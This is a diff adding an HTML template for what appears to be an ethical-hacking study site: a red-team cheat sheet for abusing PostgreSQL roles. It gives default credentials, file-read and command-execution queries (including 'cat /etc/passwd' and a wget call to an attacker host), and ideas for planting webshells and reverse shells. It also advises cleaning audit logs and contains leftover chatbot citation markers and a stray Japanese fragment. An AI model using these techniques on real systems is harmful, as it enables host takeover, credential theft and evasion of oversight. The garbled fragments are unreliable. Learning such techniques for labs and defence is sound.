@@ -1,0 +1,112 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>How to use</h1>
+    <div class="code-box"><pre><code>psql -U postgres -h 127.0.0.1 -p 8002</code></pre></div>
+    <ul><li>default credential postgres:postgres</li></ul>
+    
+    <h1>Commands</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Command</th>
+                <th>Explain</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>\du</td>
+                <td>Describe User -> you can see privileges</td>
+            </tr>
+        </tbody>
+    </table>
+
+ <h1>Privileges</h1>
+<table>
+    <thead>
+        <tr>
+            <th>Role</th>
+            <th>Explain - What's feasible (red-team / OSCP perspective)</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>pg_read_server_files</td>
+            <td>
+                Allows reading files that the PostgreSQL server process can access (via COPY, pg_read_file(), pg_ls_dir() 等のファイル系関数).<br>
+                <strong>Red-team:</strong> read sensitive files on the host (postgres configs, logs, credential files if readable, SSH keys if mis-permissioned, /etc/passwd, application config files). Typical technique: <code>SELECT pg_read_file('path');</code> or <code>COPY (SELECT '') FROM PROGRAM 'cat /etc/passwd';</code> (or COPY FROM to import file contents). :contentReference[oaicite:1]{index=1}<br>
+                <strong>OSCP notes:</strong> high-value for local infoleak and credential discovery. If DB runs as root (misconfigured), this becomes catastrophic. Even as 'postgres' user, you can often read config files with secrets. Mitigate by not granting this to untrusted accounts, restrict filesystem permissions, monitor use of file functions.
+            </td>
+        </tr>
+        <tr>
+            <td>pg_write_server_files</td>
+            <td>
+                Allows writing files that the PostgreSQL server process can access (via COPY TO/FROM, functions that create files).<br>
+                <strong>Red-team:</strong> write a webshell, drop an SSH authorized_keys entry (if permissions allow), create cron files, plant a reverse-shell launcher, or write payloads to /tmp and then attempt to execute them via other mechanisms. Example: <code>COPY (SELECT 'payload') TO '/tmp/payload.sh';</code> then attempt to execute. :contentReference[oaicite:2]{index=2}<br>
+                <strong>OSCP notes:</strong> combined with some execution vector (e.g., ability to run programs via other misconfigurations or via pg_execute_server_program) this enables remote command execution on the host. Monitor & deny write role to users that don't need it, and ensure DB process has minimal filesystem rights.
+            </td>
+        </tr>
+        <tr>
+            <td>pg_execute_server_program<br/>(note: often named <code>pg_execute_server_program</code>)</td>
+            <td>
+                Grants the ability to execute server-side programs as the DB process user (via COPY ... TO/FROM PROGRAM and similar features). Official doc name is <code>pg_execute_server_program</code>. With this you can run arbitrary programs/commands on the DB host as the postgres user. :contentReference[oaicite:3]{index=3}<br>
+                <strong>Red-team:</strong> highest-risk non-superuser privilege — you can run commands (eg. <code>COPY (SELECT 1) TO PROGRAM 'wget http://attacker/;'</code> or pipe results to reverse shells). Typical escalation: write a binary/script (pg_write_server_files) and execute it (pg_execute_server_program) or directly use COPY TO PROGRAM to invoke commands. Many public PoCs show privilege escalation to arbitrary OS command execution from this role. :contentReference[oaicite:4]{index=4}<br>
+                <strong>OSCP notes:</strong> owning this role in a lab = almost direct OS RCE (as postgres user). Treat as equivalent to full compromise for practical exploitation; clean audit logs and be cautious about leaving artifacts.
+            </td>
+        </tr>
+        <tr>
+            <td>Superuser</td>
+            <td>
+                Full control of the PostgreSQL cluster and ability to perform any action, including creating roles, reading/writing any file, executing functions, altering system catalogs, and loading untrusted extensions. From red-team view, superuser access is equivalent to complete DB compromise and usually leads to host compromise (via file writes / program execution / extension loading). :contentReference[oaicite:5]{index=5}<br>
+                <strong>OSCP notes:</strong> superuser = game over for target DB. If you can get a superuser role, you can create a new role with pg_execute_server_program, or directly use features to escalate to OS root in some misconfigured setups.
+            </td>
+        </tr>
+
+        <!-- Additional interesting predefined roles -->
+        <tr>
+            <td>pg_signal_backend</td>
+            <td>
+                Allows sending signals to other server backends (cancel query or terminate session).<br>
+                <strong>Red-team:</strong> can disrupt other sessions, kill replication, or cause DoS on specific queries — useful for denial-of-service or to block defenders' queries. Not directly an info-leak but helpful for disruption during exploitation.
+            </td>
+        </tr>
+        <tr>
+            <td>pg_read_all_settings / pg_read_all_stats / pg_stat_scan_tables</td>
+            <td>
+                Read cluster-wide configuration and statistics (server settings, planner stats, table scan stats).<br>
+                <strong>Red-team:</strong> can discover internal configuration: listen addresses, data directory, logging settings, enabled extensions, max_worker_processes, etc. This info helps pick exploitation paths (e.g., whether copy/program is allowed, file paths to target). Useful reconnaissance prior to file or code execution. :contentReference[oaicite:6]{index=6}
+            </td>
+        </tr>
+        <tr>
+            <td>pg_monitor</td>
+            <td>
+                Broad read-only monitoring access (includes read_all_stats/settings).<br>
+                <strong>Red-team:</strong> similar to above but packaged for monitoring; useful to fingerprint the environment and detect presence of features or misconfigurations.
+            </td>
+        </tr>
+        <tr>
+            <td>pg_read_all_data / pg_write_all_data</td>
+            <td>
+                Grant broad read or write access to all tables (cluster-wide).<br>
+                <strong>Red-team:</strong> pg_read_all_data lets you dump all DB contents without table-specific grants — high value for data exfiltration. pg_write_all_data lets you tamper with data globally (poisoning, creating backdoors in app data). These are serious from a data-exfil/POC perspective.
+            </td>
+        </tr>
+    </tbody>
+</table>
+
+
+    <h1>Command execution</h1>
+    <div class="code-box"><pre><code>DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'COMMAND HERE'
+____
+SELECT * FROM cmd_exec;</code></pre></div>
+</body>
+</html>
